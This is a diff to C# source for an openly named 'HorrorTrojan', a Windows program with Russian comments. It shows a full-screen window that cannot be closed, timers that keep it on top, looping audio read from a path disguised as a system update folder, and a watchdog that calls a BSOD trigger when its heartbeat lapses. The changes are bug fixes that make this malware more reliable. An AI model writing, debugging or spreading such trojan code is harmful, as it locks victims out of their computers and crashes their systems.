@@ -34,6 +34,7 @@ namespace HorrorTrojan
         private SoundPlayer musicPlayer;
         private string musicPath = @"C:\Windows\ProgramFiles\SystemUpdate\hr.wav";
         private bool bsodTriggered = false;
+        private bool musicInitialized = false;
 
         public MainInterface()
         {
@@ -43,7 +44,7 @@ namespace HorrorTrojan
             this.DoubleBuffered = true;
             this.SetStyle(ControlStyles.AllPaintingInWmPaint | ControlStyles.UserPaint | ControlStyles.Opaque, true);
             
-            InitializeMusic();
+            // Музыка инициализируется в Load, после того как форма полностью создана
         }
 
         private void InitializeComponent()
@@ -58,10 +59,10 @@ namespace HorrorTrojan
             this.ControlBox = false;
             this.DoubleBuffered = true;
 
-            bloodTimer.Interval = 30;
+            bloodTimer.Interval = 50;  // 50 мс для плавности (20 кадров/сек)
             bloodTimer.Tick += BloodTimer_Tick;
 
-            drawTimer.Interval = 30;
+            drawTimer.Interval = 50;
             drawTimer.Tick += DrawTimer_Tick;
 
             topMostTimer.Interval = 100;
@@ -106,11 +107,12 @@ namespace HorrorTrojan
         {
             try
             {
-                if (System.IO.File.Exists(musicPath))
+                if (System.IO.File.Exists(musicPath) && !musicInitialized)
                 {
                     musicPlayer = new SoundPlayer(musicPath);
                     musicPlayer.Load();
                     musicPlayer.PlayLooping();
+                    musicInitialized = true;
                 }
             }
             catch { }
@@ -120,9 +122,10 @@ namespace HorrorTrojan
         {
             try
             {
-                if (musicPlayer != null)
+                if (musicPlayer != null && !musicInitialized)
                 {
                     musicPlayer.PlayLooping();
+                    musicInitialized = true;
                 }
             }
             catch { }
@@ -135,6 +138,7 @@ namespace HorrorTrojan
                 if (musicPlayer != null)
                 {
                     musicPlayer.Stop();
+                    musicInitialized = false;
                 }
             }
             catch { }
@@ -160,7 +164,7 @@ namespace HorrorTrojan
                 Thread.Sleep(500);
                 try
                 {
-                    if ((DateTime.Now - lastPing).TotalSeconds > 2)
+                    if ((DateTime.Now - lastPing).TotalSeconds > 3)
                     {
                         StopMusic();
                         if (!bsodTriggered) BSODTrigger.TriggerBSOD();
@@ -200,6 +204,7 @@ namespace HorrorTrojan
         private void MainInterface_Load(object sender, EventArgs e)
         {
             startTime = DateTime.Now;
+            InitializeMusic();
             bloodTimer.Start();
             drawTimer.Start();
             protectTimer.Start();
@@ -214,13 +219,18 @@ namespace HorrorTrojan
                 TimeSpan elapsed = DateTime.Now - startTime;
                 double percent = (elapsed.TotalSeconds / maxSeconds) * 100.0;
                 
-                if (double.IsInfinity(percent) || double.IsNaN(percent) || percent > 100)
-                {
-                    percent = 100;
-                }
-                if (percent < 0) percent = 0;
+                // КОРРЕКТНАЯ ЗАЩИТА ОТ БАГОВ
+                if (double.IsNaN(percent) || double.IsInfinity(percent))
+                    percent = 0;
                 
-                bloodLevel = 100 - (int)percent;
+                if (percent < 0) percent = 0;
+                if (percent > 100) percent = 100;
+                
+                int newBloodLevel = 100 - (int)Math.Round(percent);
+                if (newBloodLevel < 0) newBloodLevel = 0;
+                if (newBloodLevel > 100) newBloodLevel = 100;
+                
+                bloodLevel = newBloodLevel;
                 
                 if (elapsed.TotalSeconds >= maxSeconds || bloodLevel <= 0)
                 {
@@ -344,6 +354,7 @@ namespace HorrorTrojan
             e.Cancel = true;
         }
 
+        // ===== ПЕРЕТАСКИВАНИЕ ОКНА (ИСПРАВЛЕНО) =====
         private void MainInterface_MouseDown(object sender, MouseEventArgs e)
         {
             if (e.Button == MouseButtons.Left)
